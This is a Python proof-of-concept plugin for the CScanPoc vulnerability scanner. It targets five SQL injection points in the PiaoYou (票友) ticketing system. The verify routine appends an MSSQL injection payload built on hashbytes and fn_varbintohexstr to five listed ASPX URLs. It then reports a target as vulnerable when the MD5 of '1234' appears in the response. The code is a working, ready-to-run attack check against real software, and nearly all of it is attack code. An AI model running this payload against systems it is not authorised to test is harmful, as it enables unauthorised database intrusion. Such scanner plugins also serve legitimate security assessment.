# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '0c75f153-f664-4df1-b67c-02e974632e2b'
    name = '票友票务系统通用五处sql注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-09-06'  # 漏洞公布时间
    desc = '''
        票友票务系统通用五处sql注入漏洞：
        "/flight/Print_tp.aspx?sid=1",
        "/flight/Print_tp_3.aspx?sid=1",
        "/flight/scgq_detail.aspx?id=1",
        "/Finance/Inv_req.aspx?id=1",
        "/flight/refund_update.aspx?id=1",   
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0116851
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'PiaoYou(票友软件)'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4e67d367-bbbb-41bd-b42e-68ff9db54920'
    author = '国光'  # POC编写者
    create_date = '2018-05-22' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            urls = [
            "/flight/Print_tp.aspx?sid=1",
            "/flight/Print_tp_3.aspx?sid=1",
            # "Other/train_order_detail.aspx?id=",
            "/flight/scgq_detail.aspx?id=1",
            "/Finance/Inv_req.aspx?id=1",
            "/flight/refund_update.aspx?id=1",
            ]

            data = "and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--"
            for url in urls:
                vul = arg + url + data
                code, head, res, errcode, _ = hh.http(vul)
                if code!=0 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()